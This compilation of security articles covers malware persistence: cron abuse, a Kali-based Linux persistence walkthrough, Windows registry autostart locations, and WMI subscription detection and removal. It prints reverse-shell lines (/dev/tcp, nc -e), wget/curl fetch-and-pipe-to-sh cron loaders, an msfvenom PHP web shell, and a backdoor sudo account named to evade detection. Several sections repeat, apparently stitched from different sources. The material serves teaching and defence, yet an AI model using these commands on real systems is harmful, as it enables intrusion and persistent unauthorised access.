T1053.003 Cron Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.

The scheduled task in Cron is called a cron job. There are two main types of cron jobs: user-specific and system-wide.

User-specific cron jobs are typically located in:

  • /var/spool/cron/
  • /var/spool/cron/crontabs/

System-wide cron jobs can be found in:

  • /etc/crontab
  • /etc/cron.d/
  • /etc/cron.daily/
  • /etc/cron.hourly/
  • /etc/cron.monthly/
  • /etc/cron.weekly/

The syntax for cron jobs varies based on where the cron file is created. In system-wide cron files (e.g., /etc/cron.d/), the user must be specified:

* * * * * root /bin/bash -c '/srv/backup_tool.sh'

For user-specific cron files in /var/spool/cron/crontabs/, the user who created the file will execute the cron job:

* * * * * /bin/bash -c '/srv/backup_tool.sh'

The asterisks represent the following fields, in order: minutes, hours, days of the month, months, and days of the week. For example:

  • * * * * *: Executes every minute.
  • * * 1 12 *: Executes every minute on the first day of December.

Attackers can exploit cron jobs to execute scripts or binaries that establish reverse connections or add reverse shell commands, such as:

* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.1.1/1337 0>&1'

MITRE ATT&CK specifies more information and real-world examples related to this technique in T1053.003.

Malware Persistence via Cron Jobs and System Commands

If malware is anything at all, it’s persistent. On Linux, just like Windows, malware once loaded wants to stay loaded. On Windows systems, this is usually done with a variety of registry mechanisms. For Linux, it’s often achieved using the crontab scheduling facility.

The Cron Facility on Linux

The cron facility on Linux mimics the Unix cron facility that has existed for decades. Essentially, as a user, you can instruct the computer to run a task on a periodic basis. This is typically used for maintenance scripts, backups, and other common automated tasks.

However, many system administrators don’t pay much attention to crontab (or its sister utility, “at”). As a result, malware has become adept at injecting itself into these areas to ensure it always remains on the host, even if you try to remove it. Attackers inject their commands into cron jobs, which then ensure their malware runs and stays up-to-date at regular intervals. If you don’t monitor these areas for signs of an intruder, you may be overlooking backdoors that allow attackers to re-enter at will.

Malicious Cron Jobs Examples

Recently, malware has taken advantage of simple system commands like wget and curl to pull over malicious code and updates. A common technique involves embedding a covert channel within a file that appears to be an ordinary jpg or png file. The file is actually a shell script designed to execute the malicious payload. Below are some examples of malicious cron jobs:

Example 1: Simple Loader via Wget

*/11 * * * * wget -O - -q http://<malicious_url>/pics/logo.jpg | sh

This example simply downloads a file that’s named like a JPG file, but it is actually a shell script that will be executed once downloaded.

Example 2: Stealthy Payload via Curl

*/5 * * * * curl http://<malicious_url>/malicious.png -k | dd skip=2446 bs=1 | sh

This second example is a more stealthy method. The file, which appears to be a png image, is actually a malicious payload. The curl command downloads it, while the dd command skips over 2446 bytes to reach the malicious payload and then runs it via the sh command. This method is more covert, as the file initially seems benign when inspected with common filesystem tools.

Persistence Techniques on Linux

Our objective is to establish persistence on the Linux target after we have obtained an initial foothold. Some persistence techniques will require “root” privileges in order to be executed successfully.

Persistence via SSH Keys

The first persistence technique we will be exploiting is the process of generating and using SSH key-based authentication. This will help maintain access to the target system if the user account passwords are changed. This is common in environments where password security policies are enforced.

Note: This technique requires Public Key Authentication to be enabled in the SSH configuration file. More details on how to add SSH keys can be found here.

Steps to achieve persistence via SSH keys:

  1. Generate an SSH key pair: On your Kali VM, run: 
    ssh-keygen
  2. Copy the public key: Copy the content of the public key (id_rsa.pub) and add it to the authorized_keys file in the target user account’s .ssh directory on the target system. 
    mkdir ~/.ssh && touch ~/.ssh/authorized_keys
  3. Set proper permissions: 
    chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
  4. Now you can authenticate to the target via SSH without needing a password.

Creating a Privileged Local Account

This technique involves creating a local privileged user account that can be used for backdoor access, even if the user password is changed. It's important to create a username that blends in, for example, naming the user account “ftp” to avoid detection.

Note: You will need root privileges to create a new user account.

Steps to create a privileged local account:

  1. Create a new user: 
    useradd -m -s /bin/bash ftp
  2. Add the user to the sudo group: 
    usermod -aG sudo ftp
  3. Set a password for the new user: 
    passwd ftp
  4. Confirm the new account: 
    cat /etc/passwd
  5. Test the account with sudo commands to confirm administrative privileges:
    6. sudo apt update

Unix Shell Configuration Modification

In this technique, we will add a reverse shell command to the .bashrc file in the user's home directory. The .bashrc file is executed each time the user logs in, so we can insert a command that connects back to our listener, providing persistent access.

Steps for Unix shell configuration modification:

  1. Edit the .bashrc file: 
    nano ~/.bashrc
  2. Add the reverse shell command: 
    nc -e /bin/bash   2>/dev/null &
  3. Set up a listener on Kali: 
    nc -nvlp
  4. When the user logs in, the reverse shell will be triggered, giving you access.

Persistence via Web Shell

This technique involves uploading a PHP web shell to the target server. Since the target is running a LAMP stack, we can create a PHP meterpreter payload and upload it as a backdoor.

Steps for persistence via a web shell:

  1. Generate a PHP Meterpreter payload: 
    msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -e php/base64 -f raw > backup.php
  2. Modify the file: Add PHP tags to the generated payload and save it as "backup.php".
  3. Set up the Metasploit listener: 
    msfconsole
            use multi/handler
            set payload php/meterpreter/reverse_tcp
            set LHOST 
            set LPORT 
            run
  4. Upload the payload to the web server: 
    wget http:///backup.php
  5. Access the web shell by visiting http:///backup.php in the browser, which will trigger a meterpreter session.

Persistence via Cron Jobs

This technique uses Cron jobs to execute commands at scheduled intervals. By creating a Cron job to execute a reverse shell or a web shell periodically, we can maintain persistent access to the system.

Steps for persistence via Cron jobs:

  1. Edit the crontab file: 
    crontab -e
  2. Set up the cron job: 
    * * * * * nc   -e /bin/sh
  3. Set up a listener on Kali: 
    nc -nvlp
  4. After one minute, the cron job will execute and provide a reverse shell connection.

Alternatively, you can run the PHP Meterpreter payload using Cron jobs:

* * * * * php -f /var/www/html/backup.php

After one minute, a meterpreter session will be established.

Windows Persistence via Registry Key Modifications

Malware often utilizes modifications to Windows registry keys to achieve persistence on a system. Below are some of the most common registry values and locations that malware may exploit to maintain persistence:

Run/RunOnce Keys

Windows provides various AutoStart Extension Points (ASEPs) to manage programs that should start automatically. Many types of malware utilize the following registry keys to execute on system startup:

  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

These keys operate at the user level and are commonly exploited by malware to achieve persistence if it is unable to obtain administrator or system-level privileges.

At the system level, the following keys are targeted:

  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

BootExecute Key

The BootExecute key is a particularly significant location because it controls what executes before the Windows subsystem fully loads. The smss.exe process, which runs early in Windows startup, will check and execute entries in the BootExecute key located at:

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager\BootExecute

This key should always have the default value autocheck autochk*. If additional values are present, it is possible that malware is scheduled to run at boot.

Keys Used by WinLogon Process

The WinLogon process is essential for managing user logons, and certain registry keys can be modified to ensure malicious executables are run during logon:

  • Userinit Key: This key specifies the executable that WinLogon runs when a user logs in. It is located at:
    • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

    By default, it points to userinit.exe. If this key is altered, malicious executables can be run during the login process.

  • Notify Subkeys: WinLogon also uses the Notify subkeys to load DLLs when Secure Attention Sequence (SAS, like Ctrl+Alt+Del) occurs. These are located at:
    • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
  • Explorer.exe Key: The registry key at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell points to explorer.exe, which should only contain the string explorer.exe. If modified, it could execute other malicious files.

Startup Keys

Malware can also place malicious files in startup locations, making them run automatically on logon or reboot. These startup locations are controlled via registry keys:

  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

Windows Services

Many Windows services, such as the Workstation and Windows Event Log services, are required to run at boot. Malware can place malicious files in the following registry keys to ensure the files are executed when these services start:

  • HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices

Browser Helper Objects (BHO)

Browser Helper Objects are DLL modules that load when Internet Explorer starts. They can be exploited by malware for data theft and other malicious activities. These are located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects

AppInit_DLLs

This registry key points to DLLs that are loaded by User32.dll during the Windows login process. Malware often places malicious DLLs here to ensure they are loaded when any executable runs:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

File Association Keys

File association keys in the registry control what happens when a certain file type is opened. Malware may exploit these keys to ensure its malicious files are opened with certain file types:

HKEY_CLASSES_ROOT\textfile\shell\open\command

DLL Search Order Hijacking

Malware can hijack the DLL search order to load a malicious DLL before a legitimate one. The OS checks for DLLs in a specific order, which malware can exploit by placing its DLL in an earlier directory. The KnownDLLs registry key is one of the places the OS checks first:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

Malware can place its DLL in one of the search directories, bypassing the legitimate DLL.

Shortcut Hijacking

Malware can hijack shortcut icons by modifying their Target attribute, causing them to download malicious content when the shortcut is executed.

Other Persistence Methods

Aside from registry key modifications, malware can also achieve persistence by infecting the Master Boot Record (MBR), hijacking COM objects, or using other techniques to remain undetected on infected systems.

Windows Persistence via Registry Key Modifications (Extended)

In addition to the standard registry keys, there are several other keys and techniques malware uses to maintain persistence on a Windows system. Below are additional registry locations and methods often targeted by malware:

Run/RunOnce Keys

Windows AutoStart Extension Points (ASEP) are commonly used by malware to ensure they execute during startup. At the user level, malware typically targets these registry keys:

  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

If malware gains administrative privileges, it may also modify the following system-level keys:

  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

Update (2019/03/25)

As pointed out by Jerry Cooke in the comments, there are additional locations that may be used for persistence:

  • HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
  • HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce

These locations exist for 64-bit applications and can be overlooked by analysts. Thanks to Jerry for this valuable input!

BootExecute Key

The BootExecute key is used to launch processes during system startup, before the Windows subsystem fully loads. The smss.exe process calls the configuration subsystem to load the hive present at:

HKLM\SYSTEM\CurrentControlSet\Control\hivelist

Also, smss.exe will execute anything listed in the BootExecute key at:

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager

The BootExecute key should only contain the value autocheck autochk*. If additional entries are present, it may indicate malware is configured to launch at boot.

Userinit Key

The WinLogon process uses the Userinit key to specify login scripts and other login-related activities. This key is located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

Typically, the Userinit key points to userinit.exe, but malware can modify this key to run its own malicious executable during login.

Notify

WinLogon also handles the Secure Attention Sequence (SAS) like Ctrl+Alt+Del. When SAS occurs, subkeys in the Notify registry key are used to load a DLL. Malware can modify these subkeys to execute its own DLL whenever SAS is triggered. These keys are located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify

Explorer.exe

The Explorer.exe key, located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

should only contain the string explorer.exe. If modified, malware could cause other files to run instead of the standard Windows Explorer.

Startup Keys

Malware can place malicious files in startup locations to ensure they execute on login or system reboot. The relevant registry keys include:

  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
  • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
  • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

Windows Services

Windows services such as Workstation, Server, Windows Event Log, and other drivers run during boot. Malware can use these services to load malicious files. Relevant registry keys include:

  • HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ServicesOnce
  • HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Services

Additionally, malicious files can be loaded if a service fails to start, providing another method of persistence.

Browser Helper Objects (BHO)

Browser Helper Objects (BHOs) are DLL modules loaded when Internet Explorer starts. These are commonly exploited for data theft and other malicious activities. BHOs are located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects

Malware can modify these subkeys to instruct the browser to load malicious DLLs during startup.

AppInit_DLLs

This registry key specifies DLLs loaded by the User32.dll module. Since most executables load User32.dll, placing a malicious DLL here ensures it runs whenever a program executes. The key is located at:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

File Association

File association registry keys define how certain file types are handled. Malware can hijack these keys to ensure that its malicious file is executed instead of the intended program. These keys are located at:

  • HKEY_LOCAL_MACHINE\Software\Classes
  • HKEY_CLASSES_ROOT

DLL Search Order Hijacking

Malware can hijack the search order used by Windows to load DLLs. When an executable loads, the system searches specific directories for required DLLs. By placing a malicious DLL in an earlier directory in the search order, malware can execute before legitimate DLLs. The search order is as follows:

  • The directory from which the application was launched
  • System Directory (e.g., C:\Windows\System32)
  • Windows Directory
  • Current Working Directory
  • Directories defined in the PATH variable

For more information on DLL search order, visit Microsoft's documentation on DLL search order.

Shortcut Hijacking

Another simple yet effective technique is hijacking the shortcut icons. By modifying the Target attribute of a shortcut, malware can force the shortcut to download content from a malicious website.

Bootkit

A bootkit is a type of malware that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). These malware variants reside below the operating system layer, making them difficult to detect or remove without specific remediation tools.

Master Boot Record (MBR)

The MBR is the section of the disk that is loaded first by the BIOS after hardware initialization. An attacker with raw access to the disk can overwrite this area, redirecting the boot process to adversary code, thus achieving persistence.

Volume Boot Record (VBR)

The VBR is similar to the MBR but specific to each partition on a disk. It contains code that loads the boot sector for the partition, and malware can exploit this area to ensure it runs on boot.

Removing WMI Event Subscription Persistence

Windows Management Instrumentation (WMI) Event Subscription is a popular technique that attackers use to establish persistence on an endpoint. I spent some time experimenting with Empire’s WMI modules and analyzing the artifacts for detection opportunities. Below is a review of the WMI persistence technique and how to detect and remove such threats.

What is WMI?

WMI (Windows Management Instrumentation) is Microsoft's implementation of Web-Based Enterprise Management (WBEM). It uses the Common Information Model (CIM) standard to represent systems, applications, networks, devices, and other components within an enterprise. Attackers can exploit WMI to subscribe to specific events and execute arbitrary code when these events are triggered, thus ensuring persistence on the system.

WMI Event Subscription Overview

WMI allows for the configuration of event filters, which define the conditions under which WMI will deliver events. Event consumers are responsible for handling these events and executing associated actions. In the case of malware, an event filter and event consumer can be used to execute malicious code when certain conditions are met, ensuring persistence.

MITRE ATT&CK Tactic

This technique is cataloged under MITRE ATT&CK as T1084: Windows Management Instrumentation Event Subscription.

Configuring Sysmon Logging

To detect WMI abuse, you can configure Sysmon to log WMI-related activities. Sysmon can capture WmiEventFilter, WmiEventConsumer, and WmiEventConsumerToFilter activities, which are crucial for detecting WMI-based persistence.

To configure Sysmon, use the following command to install Sysmon with a custom configuration file:

sysmon.exe -i -c .\config_file.xml

Sysmon Event IDs for WMI Activity

Sysmon captures various event IDs related to WMI activities:

  • Sysmon Event ID 19: WMI Event (WmiEventFilter activity detected)
  • Sysmon Event ID 20: WMI Event (WmiEventConsumer activity detected)
  • Sysmon Event ID 21: WMI Event (WmiEventConsumerToFilter activity detected)

Establish Persistence with Empire's WMI Module

Using Empire’s Invoke-WMI module, an attacker can create a permanent WMI subscription that ensures the persistence of a stager on the victim endpoint. Here is a breakdown of how Empire’s WMI-related modules function:

  • Registered a WMI event filter: Defines the conditions under which the stager will execute.
  • Registered a WMI event consumer: Contains the Base64-encoded stager, which is executed when the filter conditions are met.
  • Bound the event consumer to the event filter: Ensures the stager runs when the filter conditions trigger the event.

Detection of WMI Persistence

Sysmon logs will reveal the WMI-related activities associated with Empire's WMI module. The following Sysmon events help identify WMI persistence:

  • Sysmon Event ID 19: WmiEvent (WmiEventFilter activity detected) – Shows that a filter was registered.
  • Sysmon Event ID 20: WmiEvent (WmiEventConsumer activity detected) – Shows the consumer containing the stager is registered.
  • Sysmon Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected) – Indicates the consumer is bound to the filter and will execute upon triggering.

Eradication: Removing WMI Event Subscriptions

The simplest method to remove malicious WMI event subscriptions is by using a tool like Autoruns, which allows for easy inspection and removal of WMI-related entries. Here's how:

Using Autoruns to Remove WMI Entries

1. Launch Autoruns as an administrator.

2. Select the WMI tab to review any WMI-related persistence entries.

3. Right-click on the malicious WMI database entry and select Delete to remove it.

Using PowerShell to Remove WMI Event Subscriptions

If you prefer to remove WMI event subscriptions from the command line, you can use PowerShell to interact with the WMI database:

Reviewing WMI Subscriptions

To review the WMI event filter, event consumer, and binding to the event filter, use the following PowerShell commands:

# Event Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Updater'"
# Event Consumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Updater'"
# Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'"
Removing WMI Event Subscriptions

To remove the components of the WMI persistence, use the Remove-WMIObject cmdlet:

# Remove Event Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Updater'" | Remove-WmiObject -Verbose
# Remove Event Consumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Updater'" | Remove-WmiObject -Verbose
# Remove Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose

Verification

Once the WMI event subscriptions have been removed, run Autoruns again to verify that the persistence mechanism has been eradicated from the system.
